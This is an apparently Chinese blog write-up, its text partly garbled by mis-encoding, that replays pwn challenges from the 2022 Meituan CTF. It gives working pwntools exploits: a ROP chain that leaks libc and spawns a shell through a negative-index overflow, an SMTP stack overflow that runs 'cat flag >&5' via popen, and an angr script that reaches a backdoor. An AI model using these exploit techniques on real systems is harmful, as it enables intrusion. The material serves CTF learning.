<!DOCTYPE html><html lang="zh-CN"><head><title>2022å¹´ ç¬¬äº”å±Šç¾å›¢CTF Pwné¢˜å¤ç°</title><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=0.5"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="stylesheet" href="/css/highlight/xcode.min.css"><link rel="stylesheet" href="/css/bootstrap/bootstrap-tooltips.css"><link rel="stylesheet" href="/css/post.css"><script src="/js/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.2"></head><body><script>if (/mobile/i.test(navigator.userAgent) || /android/i.test(navigator.userAgent)) {
  document.body.classList.add('mobile')
}</script><div><div class="inner"><h1>2022å¹´ ç¬¬äº”å±Šç¾å›¢CTF Pwné¢˜å¤ç°</h1><div class="time">2022-10-08</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00%EF%BC%9Anote"><span class="toc-text">0x00ï¼šnote</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%EF%BC%9ASMTP"><span class="toc-text">0x01ï¼šSMTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02%EF%BC%9A%E6%8D%89%E8%BF%B7%E8%97%8F"><span class="toc-text">0x02ï¼šæ‰è¿·è—</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03%EF%BC%9Aret2libc-aarch64"><span class="toc-text">0x03ï¼šret2libc_aarch64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04%EF%BC%9A%E9%A2%98%E7%9B%AE%E9%99%84%E4%BB%B6"><span class="toc-text">0x04ï¼šé¢˜ç›®é™„ä»¶</span></a></li></ol><h2 id="0x00ï¼šnote"><a href="#0x00ï¼šnote" class="headerlink" title="0x00ï¼šnote"></a>0x00ï¼šnote</h2><p>åˆ†æç¨‹åºæ˜¯ä¸€ä¸ªèœå•é€‰æ‹©ï¼Œå…¶ä¸­Editå‡½æ•°é‡Œé¢å­˜åœ¨æ•´æ•°æº¢å‡ºï¼š</p>
<p><img src="/images/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/pic01.png" alt="pic01"></p>
<p>ä½†numberä¸ºè´Ÿæ•°æ—¶ï¼Œä¼šå¯¹æ•°ç»„åæ–¹å‘çš„æ•°æ®è¿›è¡Œæ“ä½œã€‚</p>
<p>åŒæ—¶ï¼Œchecksecå‘ç°PIEå’Œcanaryä¿æŠ¤æœºåˆ¶æ²¡æœ‰å¼€å¯ï¼š</p>
<pre><code>tolele@tolele-ubuntu22:~/CTFgame/2022MTCTF/pwn $ checksec note
[*] &#39;/home/tolele/CTFgame/2022MTCTF/pwn/note&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
</code></pre>
<p>é‚£ä¹ˆï¼Œå¯ä»¥å…ˆè¯•ç€å¯¹å †æ•°ç»„çš„ä¸‹è¾¹ï¼ˆåæ–¹å‘ï¼‰æŸ¥çœ‹ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å¯åˆ©ç”¨çš„ä¸œè¥¿ã€‚</p>
<p>ä»IDAå¯å¾—çŸ¥ï¼š<code>.text:0000000000401714                 call    Edit</code></p>
<p>æˆ‘ä»¬å¯ä»¥åœ¨0x401714å¤„æ–­ä¸‹ï¼Œç„¶åç”¨siæ­¥å…¥Editå‡½æ•°ï¼Œåœ¨ç»§ç»­siç›´åˆ°rsp/rbpå¸ƒç½®å¥½åï¼ŒæŸ¥çœ‹æ ˆä¸Šçš„å†…å®¹ï¼š</p>
<p><img src="/images/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/pic02.png" alt="pic02"></p>
<p>ç¬¬ä¸€æ¬¡å…ˆæ³„éœ²å‡ºlibcåŸºå€ï¼Œç¬¬äºŒæ¬¡å†è¿›è¡Œgetshellã€‚</p>
<pre><code class="python">from pwn import *
context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)

io = process(&quot;./note&quot;)
elf = ELF(&quot;./note&quot;)
libc = ELF(&quot;./libc-2.31.so&quot;)

puts_plt = elf.plt[&#39;puts&#39;]
puts_got = elf.got[&#39;puts&#39;]
pop_rdi_ret = 0x4017b3
main = 0x401679

def add(size, content):
    io.sendlineafter(&quot;5. leave&quot;, &quot;1&quot;)
    io.sendlineafter(&quot;Size:&quot;, str(size))
    io.sendlineafter(&quot;Content:&quot;, content)

def edit(idx, content):
    io.sendlineafter(&quot;5. leave&quot;, &quot;3&quot;)
    io.sendlineafter(&quot;Index: &quot;, str(idx))
    io.sendlineafter(&quot;Content: &quot;, content)
def debug():
    gdb.attach(io)
    pause()

payload = b&#39;A&#39;*8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
edit(-6, payload)
libc_base = u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;)) - libc.sym[&#39;puts&#39;]
print(&quot;@@@ libc_base = &quot; + str(hex(libc_base)))

system = libc_base + libc.sym[&#39;system&#39;]
binsh = libc_base + libc.search(b&#39;/bin/sh&#39;).__next__()
ret = 0x40101a
payload = b&#39;A&#39;*8 + p64(ret) +  p64(pop_rdi_ret) + p64(binsh) + p64(system)
edit(-6, payload)
io.interactive()
</code></pre>
<br>

<h2 id="0x01ï¼šSMTP"><a href="#0x01ï¼šSMTP" class="headerlink" title="0x01ï¼šSMTP"></a>0x01ï¼šSMTP</h2><p>ä¸€é“stmpçš„åè®®é€†å‘é¢˜ï¼Œç¨‹åºæ¯”è¾ƒå¤§ï¼Œå…ˆæ‰§è¡Œç¨‹åºæ ¹æ®ä¿¡æ¯å†è¿›è¡Œåˆ†æã€‚</p>
<pre><code>// æ‰§è¡Œç¨‹åºå……å½“æœåŠ¡ç«¯
tolele@tolele-ubuntu22:~/CTFgame/2022MTCTF/pwn/smtp/docker/bin $ ./pwn
listener: waiting for connections...     //è¿æ¥å‰å°±è¾“å‡ºçš„ä¿¡æ¯
listener: got connection from 127.0.0.1  //ä»¥ä¸‹ä¸ºè¿æ¥åè¾“å‡ºçš„ä¿¡æ¯
listener: initiated a new session worker
session 5: starting work, state 0
|                          //ç­‰å¾…å®¢æˆ·ç«¯çš„è¯·æ±‚...

// è¿æ¥,å……å½“å®¢æˆ·ç«¯
tolele@tolele-ubuntu22:~/CTFgame/2022MTCTF/pwn/smtp/docker/bin $ nc 127.0.0.1 9999
220 SMTP tsmtp
|                          //ç­‰å¾…è¾“å…¥è¯·æ±‚...
</code></pre>
<p>æœ‰äº†è¿™äº›ä¿¡æ¯åï¼Œæ¥ç€é™æ€åˆ†æç¨‹åºï¼š</p>
<pre><code class="c">// mainå‡½æ•°
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
&#123;
  if ( argc == 2 )
    listener((char *)argv[1]);
  listener(&quot;9999&quot;);           //ä¸ç‰¹å®šç›‘å¬ç«¯å£åˆ™é»˜è®¤9999
&#125;

//listenerå‡½æ•°
void __cdecl __noreturn listener(char *service)
&#123;
  // ...ç•¥...
  puts(&quot;listener: waiting for connections...&quot;);  //ç­‰å¾…è¿æ¥ï¼ˆå¯¹åº”å·²è·å–çš„ä¿¡æ¯ï¼‰
  epfd = epoll_create(16);
  event.data.fd = fd;
  event.events = 1;
  epoll_ctl(epfd, 1, fd, &amp;event);
  events = (struct epoll_event *)calloc(0x10u, 0xCu);
  while ( 1 )
  &#123;
    v12 = epoll_wait(epfd, events, 1, -1);
    for ( i = 0; i &lt; v12; ++i )
    &#123;
      if ( fd == events[i].data.fd )
      &#123;
        addr_len = 128;
        v11 = accept(fd, &amp;addr, &amp;addr_len);
        v1 = (const void *)get_in_addr(&amp;addr);
        inet_ntop(addr.sa_family, v1, buf, 0x2Eu);
        printf(&quot;listener: got connection from %s\n&quot;, buf); //è¿æ¥
        arg = malloc(0x14u);
        *(_DWORD *)arg = v11;
        *((_DWORD *)arg + 1) = 0;
        pthread_create(&amp;newthread, 0, (void *(*)(void *))session_worker, arg); //åˆ›å»ºçº¿ç¨‹,å»æ‰§è¡Œsession_workå‡½æ•°
        puts(&quot;listener: initiated a new session worker&quot;);
      &#125;
    &#125;
  &#125;
&#125;

// session_workerå‡½æ•°
void *__cdecl session_worker(int *a1)
&#123;
  // ...ç•¥...
  v35 = a1;
  fd = *a1;
  session_reset(a1);
  printf(&quot;session %d: starting work, state %d\n&quot;, fd, a1[1]);
  v1 = strlen(off_804D0A0[0]);
  send(fd, off_804D0A0[0], v1, 0);
  // ...ç•¥...
  while ( v35[1] != 5 )
  &#123;
    v29 = epoll_wait(epfd, events, 1, timeout);
    if ( !v29 )
    &#123;
      close(fd);
      printf(&quot;session %d: timeout, work is over\n&quot;, fd);
      break;
    &#125;
    if ( v29 == 1 )
    &#123;
      memset(s, 0, 0x400u);
      v28 = recv(fd, s, nmemb - 1, 0);   //æ¥æ”¶åˆ°è¯·æ±‚ï¼Œèµ‹ç»™s
      if ( !v28 )
      &#123;
        printf(&quot;session %d: client closed connection\n&quot;, fd);
        break;
      &#125;
      if ( v28 &lt; 0 )
      &#123;
        printf(&quot;session %d: recv error\n&quot;, fd);
        break;
      &#125;
      ptr = (void *)parse_request((char *)s);  //è§£æè¯·æ±‚
      if ( v35[1] != 4 || *(_DWORD *)ptr == 4 )
      &#123;
        if ( v35[1] == 4 &amp;&amp; *(_DWORD *)ptr == 4 &amp;&amp; strlen((const char *)s) &gt; 3 )
        &#123;
          if ( *(_DWORD *)(v35[4] + 8) )
          &#123;
            v7 = strlen((const char *)s);
            v24 = v7 + strlen(*(const char **)(v35[4] + 8)) + 1;
            v23 = (char *)malloc(v24);
            v8 = strlen(*(const char **)(v35[4] + 8));
            strncpy(v23, *(const char **)(v35[4] + 8), v8 + 1);
            v9 = strlen((const char *)s);
            strncat(v23, (const char *)s, v9 - 5);
            v23[v24] = 0;
            free(*(void **)(v35[4] + 8));
            *(_DWORD *)(v35[4] + 8) = v23;
          &#125;
          else
          &#123;
            v6 = v35[4];
            *(_DWORD *)(v6 + 8) = strdup((const char *)s);
          &#125;
          if ( *((_DWORD *)ptr + 1) )
            free(*((void **)ptr + 1));
        &#125;
        switch ( *(_DWORD *)ptr )
        &#123;
          case 0:       // HELO
            session_reset(v35);
            if ( !v35[1] )
            &#123;
              v10 = strlen(server_replies[0]);
              send(fd, server_replies[0], v10, 0);
            &#125;
            v35[1] = 1;
            v11 = strdup(*((const char **)ptr + 1));
            v35[3] = (int)v11;
            printf(&quot;session %d: state changed to greeted\n&quot;, fd);
            break;
          case 1:       // MAIL FROM:
            if ( v35[1] != 1 )
              goto LABEL_41;
            v35[1] = 2;
            v12 = (char **)v35[4];
            *v12 = strdup(*((const char **)ptr + 1));
            v13 = strlen(server_replies[0]);
            send(fd, server_replies[0], v13, 0);
            printf(&quot;session %d: got mail from\n&quot;, fd);
            break;
          case 2:       // RCPT TO:
            if ( v35[1] != 2 &amp;&amp; v35[1] != 3 )
              goto LABEL_41;
            v35[1] = 3;
            v14 = v35[4];
            *(_DWORD *)(v14 + 4) = strdup(*((const char **)ptr + 1));// é‡ç‚¹
            v15 = strlen(server_replies[0]);
            send(fd, server_replies[0], v15, 0);
            printf(&quot;session %d: state changed to got receipients\n&quot;, fd);
            break;
          case 3:       // DATA
            if ( v35[1] != 3 )
              goto LABEL_41;
            v35[1] = 4;
            v16 = strlen(off_804D0A8[0]);
            send(fd, off_804D0A8[0], v16, 0);
            printf(&quot;session %d: state changed to data receival\n&quot;, fd);
            break;
          case 4:       // .\r\n
            if ( v35[1] == 4 )
            &#123;
              session_submit(v35);
              session_reset(v35);
              v35[1] = 1;
              v17 = strlen(server_replies[0]);
              send(fd, server_replies[0], v17, 0);
              printf(&quot;session %d: data transaction over, state changed to greeted\n&quot;, fd);
            &#125;
            else
            &#123;
LABEL_41:
              v18 = strlen(off_804D0B0);
              send(fd, off_804D0B0, v18, 0);
            &#125;
            break;
          case 5:
            v35[1] = 5;
            v19 = strlen(off_804D0AC[0]);
            send(fd, off_804D0AC[0], v19, 0);
            printf(&quot;session %d: state changed to quit\n&quot;, fd);
            break;
          default:
            v20 = strlen(off_804D0A4[0]);
            send(fd, off_804D0A4[0], v20, 0);
            printf(&quot;session %d: syntax error\n&quot;, fd);
            break;
        &#125;
      &#125;
      else
      &#123;
       //...ç•¥...
      &#125;
      free(ptr);
    &#125;
  &#125;
  free(s);
  free(a1);
  printf(&quot;session %d: finished\n&quot;, fd);
  close(fd);
  return 0;
&#125;
</code></pre>
<pre><code class="c">// è¯·æ±‚è§£æå‡½æ•°,parse_request
_DWORD *__cdecl parse_request(char *s)
&#123;
  char *argument_string_start; // [esp+4h] [ebp-14h]
  char *ptr; // [esp+8h] [ebp-10h]
  _DWORD *v4; // [esp+Ch] [ebp-Ch]

  v4 = malloc(8u);
  *v4 = get_session_command(s);
  if ( *v4 == -1 )
  &#123;
    v4[1] = 0;
    return v4;
  &#125;
  else
  &#123;
    v4[1] = 0;
    ptr = strdup(s);
    argument_string_start = (char *)get_argument_string_start(ptr, *v4);
    if ( *argument_string_start )
      v4[1] = strdup(argument_string_start);
    free(ptr);
    return v4;
  &#125;
&#125;

// å¯¹åº”çš„è¯·æ±‚å‘½ä»¤
int __cdecl get_session_command(char *s1)
&#123;
  size_t v2; // eax

  if ( !strncmp(s1, &quot;HELO&quot;, 4u) )
    return 0;
  if ( !strncmp(s1, &quot;MAIL FROM:&quot;, 0xAu) )
    return 1;
  if ( !strncmp(s1, &quot;RCPT TO:&quot;, 8u) )
    return 2;
  if ( !strncmp(s1, &quot;DATA&quot;, 4u) )
    return 3;
  if ( !strncmp(s1, &quot;.\r\n&quot;, 3u) )
    return 4;
  v2 = strlen(s1);
  if ( !strncmp(&amp;s1[v2 - 5], &quot;\r\n.\r\n&quot;, 5u) )
    return 4;
  if ( !strncmp(s1, &quot;QUIT&quot;, 4u) )
    return 5;
  return -1;
&#125;
</code></pre>
<p>é€šè¿‡å¯¹è¿™å‡ ä¸ªcaseä»£ç å®¡è®¡ï¼Œå‘ç°æ¼æ´å­˜åœ¨case 4çš„session_submitå‡½æ•°ä¸­çš„sender_workerä¸­ã€‚</p>
<pre><code class="c">// session_submitå‡½æ•°
int __cdecl session_submit(_DWORD *a1)
&#123;
  pthread_t newthread[2]; // [esp+Ch] [ebp-Ch] BYREF

  printf(&quot;session %d: received message &#39;%s&#39;\n&quot;, *a1, *(const char **)(a1[4] + 8));
  printf(&quot;session %d: handing off message to sender\n&quot;, *a1);
  return pthread_create(newthread, 0, sender_worker, (void *)a1[4]);
&#125;

// sender_workerå‡½æ•°
void *__cdecl sender_worker(const char **a1)
&#123;
  char s[256]; // [esp+Ch] [ebp-10Ch] BYREF
  const char **v3; // [esp+10Ch] [ebp-Ch]

  puts(&quot;sender: starting work&quot;);
  v3 = a1;
  len = strlen(a1[1]);
  puts(&quot;sender: sending message....&quot;);
  printf(&quot;sender: FROM: %s\n&quot;, *a1);
  if ( strlen(*a1) &lt;= 79 )
    strcpy(from, *v3);     //from:0x0804d140
  if ( len &lt;= 0xFFu )   
  &#123;
    printf(&quot;sender: TO: %s\n&quot;, v3[1]);
  &#125;
  else
  &#123;
    memset(s, 0, sizeof(s));
    strcpy(s, v3[1]);      //ç›´æ¥æ‹·è´,å­˜åœ¨æº¢å‡º
    printf(&quot;sender: TO: %s\n&quot;, s);
  &#125;
  puts(&quot;sender: BODY:&quot;);
  if ( v3[2] )
    printf(&quot;%s&quot;, v3[2]);
  else
    puts(&quot;No body.&quot;);
  putchar(10);
  puts(&quot;sender: finished&quot;);
  return 0;
&#125;
</code></pre>
<p>ç°åœ¨çŸ¥é“äº†åœ¨sender_workerä¸­ï¼Œv3[1]ä¼šå¯¼è‡´æ ˆæº¢å‡ºã€‚æˆ‘ä»¬è¿˜éœ€è¦çŸ¥é“v3[1]å¯¹åº”çš„æ˜¯å“ªä¸ªå‘½ä»¤çš„æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥é€å‡½æ•°åæ¨ã€‚åæ¨å¯å¾—v3[1]æ˜¯â€RCPT TO:â€åé¢æ¥ç€çš„æ•°æ®ï¼Œä½†å…¶éœ€è¦æœ€åå¤„ç†.\r\næ—¶æ‰èƒ½è§¦å‘ã€‚</p>
<p>popenå‡½æ•°å¯ä»¥æ‰§è¡Œä»»æ„å¯æ‰§è¡Œå‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨MAIL FROM:åæ·»åŠ æ•°æ®ï¼Œå‘bssæ®µå†™å…¥â€cat flag &gt;&amp;5â€ï¼Œç„¶åä½¿ç”¨popen(â€œcat flag &gt;&amp;5â€, â€œrâ€)è¯»å–flagã€‚&gt;&amp;5æ˜¯éœ€è¦é‡å®šå‘ï¼Œå…·ä½“çš„å€¼éœ€è¦ä¸€ä¸ªä¸ªè¯•ã€‚</p>
<p>ç†è®ºä¸Šï¼špayload = bâ€™aâ€™ * 0x110 + p32(elf.plt[â€˜popenâ€™]) + p32(0xdeadbeef) + p32(bss) + p32(read)</p>
<p>ä½†æ‰§è¡Œè¿‡ç¨‹å‘ç°crashäº†ï¼Œè°ƒè¯•å‘ç°ï¼Œç¨‹åºæ–­åœ¨äº†è¿™é‡Œï¼š</p>
<p><img src="/images/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/pic03.png" alt="pic03"></p>
<p>åŸå› æ˜¯ä¸Šä¸€æ­¥æŠŠâ€™aaaaâ€™ä¼ ç»™äº†eaxï¼Œå¯¼è‡´ä¸‹ä¸ªæŒ‡ä»¤å¯¹ä¸€ä¸ªæ— æ•ˆåœ°å€è¿›è¡Œè®¿é—®ï¼Œå¯¼è‡´äº†SIGSEGVã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨[ebp - 0xc]å¤„ç»™ä¸ªæœ‰æ•ˆåœ°å€ã€‚</p>
<pre><code class="python">from pwn import *
context(os=&#39;linux&#39;, arch=&#39;i386&#39;, log_level=&#39;debug&#39;)

io = remote(&quot;127.0.0.1&quot;, 9999)
elf = ELF(&quot;./pwn&quot;)

io.sendlineafter(b&#39;220 SMTP tsmtp&#39;, b&#39;HELO&#39;)
io.sendlineafter(b&#39;250 Ok&#39;, b&#39;MAIL FROM:&#39; + b&#39;cat flag &gt;&amp;5&#39;)   # shellcode
read = elf.search(b&#39;r\x00&#39;).__next__()
bss = 0x0804D140
payload = b&#39;a&#39; * 0x100 + p32(0x08049024) + b&#39;a&#39; * 0xc + p32(elf.plt[&#39;popen&#39;]) + p32(0xdeadbeef) + p32(bss) + p32(read)
io.sendlineafter(b&#39;250 Ok&#39;, b&#39;RCPT TO:&#39; + payload)
io.sendlineafter(b&#39;250 Ok&#39;, b&#39;DATA&#39; + b&#39;bbbb&#39;)
io.sendline(b&#39;.\r\n&#39;)
io.interactive()
</code></pre>
<br>

<h2 id="0x02ï¼šæ‰è¿·è—"><a href="#0x02ï¼šæ‰è¿·è—" class="headerlink" title="0x02ï¼šæ‰è¿·è—"></a>0x02ï¼šæ‰è¿·è—</h2><p>ä¸‹é¢æ˜¯ç¨‹åºçš„å‡½æ•°è°ƒç”¨å…³ç³»å›¾ï¼Œè¿™æ ·ä¸€çœ‹ï¼Œå€’ä¸ç®—æ˜¯å¤ªå¤æ‚ã€‚ä½†ç‚¹è¿›mainå‡½æ•°ä¸€çœ‹ï¼ŒğŸ’©ğŸ’©ğŸ’©ã€‚</p>
<img src="/images/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/pic04.png" alt="pic04" style="zoom:80%;" />

<br>

<p>äº‹åè¯¸è‘›äº®ä¸€æ³¢ï¼š</p>
<p>ç¨‹åºä¸­ç»™å‡ºäº†backdoorå‡½æ•°å¯ä»¥ç›´æ¥getshellï¼Œç”±äºå‡½æ•°é‡Œé¢å¤§é‡å‡ºç°äº†input_valå’Œinput_lineçš„è¾“å…¥å‡½æ•°ï¼Œæ‰€ä»¥å¯ä»¥ä¼˜å…ˆè€ƒè™‘ç®€å•çš„æ ˆæº¢å‡ºã€‚input_lineå‡½æ•°ä¼šå¯¹å±€éƒ¨å˜é‡è¿›è¡Œè¾“å…¥ï¼Œè¿™ä¹ˆå¤šå˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥ä»é è¿‘rbpä¸€ç«¯çš„å˜é‡å¼€å§‹æŒ‰é¡ºåºå¯»æ‰¾ï¼ŒæŸ¥çœ‹å‡½æ•°ä¸­å“ªé‡Œå¼•ç”¨äº†å˜é‡ã€‚å¯¹ç€å˜é‡å³é”®ï¼Œ<code>Jump to xref</code>ï¼Œå°±å¯ä»¥æŸ¥çœ‹å“ªé‡Œå¼•ç”¨äº†è¯¥å˜é‡ã€‚</p>
<p><img src="/images/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/pic06.png" alt="pic06"></p>
<p>é€šè¿‡æŸ¥æ‰¾ï¼Œå‘ç°äº†å˜é‡v341å­˜åœ¨æ ˆæº¢å‡ºï¼š</p>
<p><img src="/images/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/pic07.png" alt="pic07"></p>
<p>æˆ‘ä»¬é¦–å…ˆé€šè¿‡angræ‰¾åˆ°èƒ½æ‰§è¡Œåˆ°è¯¥è·¯å¾„çš„ç¬¦å·å˜é‡ï¼Œç„¶åæ·»åŠ èƒ½æ‰§è¡Œgetshellçš„çº¦æŸï¼Œå½“ç¬¦å·å˜é‡æ»¡è¶³æ—¶ï¼Œå‘é€æ•°æ®å»getshellï¼ˆå™¢~è¿™ç³Ÿç³•çš„è¡¨è¾¾ğŸ¤§ï¼‰ã€‚å› ä¸ºç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­<code>fksth</code>ã€<code>input_line</code>å’Œ<code>input_val</code>å‡½æ•°ä¼šå¤§é‡æ‰§è¡Œï¼Œä¸”å…¶å†…éƒ¨å«æœ‰å¾ªç¯ï¼Œä¸ºäº†é˜²æ­¢æ¢ç´¢è¿‡ç¨‹ä¸­è·¯å¾„çˆ†ç‚¸ï¼Œéœ€è¦ç¼–å†™ç›¸åº”çš„hookå‡½æ•°å¯¹å…¶æ›¿ä»£ã€‚å…·ä½“çš„hookå‡½æ•°è§expä¸­çš„<code>ReplacementCheckEquals</code>ã€<code>ReplacementInputVal</code>å’Œ<code>ReplacementCheckInput</code>å‡½æ•°ã€‚è‡³äºæ–‡ä¸­stateçš„<code>unconstrained</code>ï¼Œä¸ªäººç†è§£æ˜¯ä¿å­˜éœ€è¦ç”¨æˆ·è¾“å…¥çš„è·¯å¾„ã€‚</p>
<p>æœ¬é¢˜çš„ä¸€ä¸ªç–‘æƒ‘ç‚¹æ˜¯add_constraintså‡½æ•°å…·ä½“åšäº†ä»€ä¹ˆï¼Ÿd = simgr.explore()ä¹‹åï¼Œd.unconstrainedæ˜¯å›ºå®šçš„äº†ï¼Œé‚£æ¯ä¸ªè·¯å¾„çº¦æŸçš„ç¬¦å·å˜é‡ä¼šä¸ä¼šæ˜¯å¤šä¸ªå‘¢ï¼Ÿå¦‚æœæ˜¯å•ä¸ªçš„è¯ï¼Œæ˜¾ç„¶åé¢çš„æ·»åŠ çš„çº¦æŸå°±æ²¡æœ‰æ„ä¹‰äº†ã€‚è¿˜æœ‰å°±æ˜¯æ·»åŠ çš„çº¦æŸæ˜¯è¦æ±‚å¯¹åœ°å€ç»å¯¹çš„ç¬¦åˆï¼Œå¦‚æœç¬¦å·å˜é‡çš„éšæœºæ¨¡æ‹Ÿçš„ï¼Œå²‚ä¸æ˜¯ç›¸å½“äºçˆ†ç ´ï¼Ÿä¸è¿‡ï¼Œæ‰§è¡Œexpå¾ˆå¿«å°±æœ‰ç»“æœäº†ï¼Œä¸ªäººçŒœæµ‹ï¼šæŸæ¬¡æ£€æŸ¥ç¬¦å·å˜é‡ä¸æ»¡è¶³é‚£ä¸¤ä¸ªçº¦æŸåï¼Œä¸‹ä¸€æ¬¡ç”Ÿæˆç¬¦å·å˜é‡æ—¶ï¼Œangrä¼šä¸ä¼šæœ‰ä»€ä¹ˆæœºåˆ¶æ ¹æ®ä¸Šä¸€æ¬¡çš„å—é˜»çº¦æŸæ¥è¿›è¡Œè°ƒæ•´ï¼Œä»è€Œç”Ÿæˆæ»¡è¶³è¿™ä¸¤ä¸ªçº¦æŸçš„ç¬¦å·å˜é‡ã€‚</p>
<p>çœ‹æ¥è¿˜å¾—æ·±å…¥äº†è§£~</p>
<pre><code class="python"># æ¥è‡ªtokaå¸ˆå‚…çš„exp
# ipython3 exp.py
from pwn import *
import angr
import claripy
import base64
ret_rop = 0x4013C8
 
r=process(&quot;./pwn&quot;)
 
p = angr.Project(&quot;./pwn&quot;)
 
def getBVV(state, sizeInBytes, type = &#39;str&#39;):
    global pathConditions
    name = &#39;s_&#39; + str(state.globals[&#39;symbols_count&#39;])
    bvs = claripy.BVS(name, sizeInBytes * 8)
    state.globals[&#39;symbols_count&#39;] += 1
    state.globals[name] = (bvs, type)
    return bvs
 
def angr_load_str(state, addr):
    s, i = &#39;&#39;, 0
    while True:
        ch = state.solver.eval(state.memory.load(addr + i, 1))
        if ch == 0: break
        s += chr(ch)
        i += 1
    return s
 
class ReplacementCheckEquals(angr.SimProcedure):
    def run(self, str1, str2):
        cmp1 = angr_load_str(self.state, str2).encode(&quot;ascii&quot;)
        cmp0 = self.state.memory.load(str1, len(cmp1))
        self.state.regs.rax = claripy.If(cmp1 == cmp0, claripy.BVV(0, 32), claripy.BVV(1, 32))
 
class ReplacementCheckInput(angr.SimProcedure):
    def run(self, buf, len):
        len = self.state.solver.eval(len)
        self.state.memory.store(buf, getBVV(self.state, len))
 
class ReplacementInputVal(angr.SimProcedure):
    def run(self):
        self.state.regs.rax = getBVV(self.state, 4, &#39;int&#39;) 
 
 
p.hook_symbol(&quot;fksth&quot;, ReplacementCheckEquals())
p.hook_symbol(&quot;input_line&quot;, ReplacementCheckInput())
p.hook_symbol(&quot;input_val&quot;, ReplacementInputVal())
 
enter = p.factory.entry_state()
enter.globals[&#39;symbols_count&#39;] = 0
simgr = p.factory.simgr(enter, save_unconstrained=True)
d = simgr.explore()
backdoor = p.loader.find_symbol(&#39;backdoor&#39;).rebased_addr
for state in d.unconstrained:
    bindata = b&#39;&#39;
    rsp = state.regs.rsp
    next_stack = state.memory.load(rsp, 8, endness=p.arch.memory_endness)
    state.add_constraints(state.regs.rip == ret_rop)
    state.add_constraints(next_stack == backdoor)
    for i in range(state.globals[&#39;symbols_count&#39;]):
        s, s_type = state.globals[&#39;s_&#39; + str(i)]
        if s_type == &#39;str&#39;:
            bb = state.solver.eval(s, cast_to=bytes)
            if bb.count(b&#39;\x00&#39;) == len(bb):
                bb = b&#39;A&#39; * bb.count(b&#39;\x00&#39;)
            bindata += bb
            print(bb)
        elif s_type == &#39;int&#39;:
            bindata += str(state.solver.eval(s, cast_to=int)).encode(&#39;ASCII&#39;) + b&#39; &#39;
            print(str(state.solver.eval(s, cast_to=int)).encode(&#39;ASCII&#39;) + b&#39; &#39;)
    print(bindata)
    r.send(bindata)
    r.interactive()
    break
</code></pre>
<br>

<h2 id="0x03ï¼šret2libc-aarch64"><a href="#0x03ï¼šret2libc-aarch64" class="headerlink" title="0x03ï¼šret2libc_aarch64"></a>0x03ï¼šret2libc_aarch64</h2><pre><code>tolele@tolele-ubuntu22:~/CTFgame/2022MTCTF/pwn/aarch $ checksec pwn
[*] &#39;/home/tolele/CTFgame/2022MTCTF/pwn/aarch/pwn&#39;
    Arch:     aarch64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3f0000)
</code></pre>
<p>ä¸€é“aarch64æŒ‡ä»¤æ¶æ„çš„é¢˜ï¼Œå…·ä½“çš„æŒ‡ä»¤å¯ä»¥è‡ªè¡Œä¸Šç½‘æœç´¢ã€‚</p>
<p>ç”¨IDAè¿›è¡Œé™æ€åˆ†æï¼š</p>
<pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp)
&#123;
  int v4; // [xsp+1Ch] [xbp+1Ch]

  init(argc, argv, envp);
  do
  &#123;
    while ( 1 )
    &#123;
      menu();
      v4 = get_int();
      if ( v4 == 3 )
        exit(0);
      if ( v4 != 1 )
        break;
      puts(&quot;sensible&gt;&gt;&quot;);
      leak();                                   // æ³„éœ²libcåŸºå€
    &#125;
  &#125;
  while ( v4 != 2 );
  puts(&quot;sensible&gt;&gt;&quot;);
  overflow();                                   // æ ˆæº¢å‡º
  return 0;
&#125;
</code></pre>
<pre><code class="C">// leakå‡½æ•°
__int64 leak()
&#123;
  const char *buf; // [xsp+18h] [xbp+18h] BYREF

  buf = 0LL;
  read(0, &amp;buf, 8uLL);
  return puts(buf);
&#125;
</code></pre>
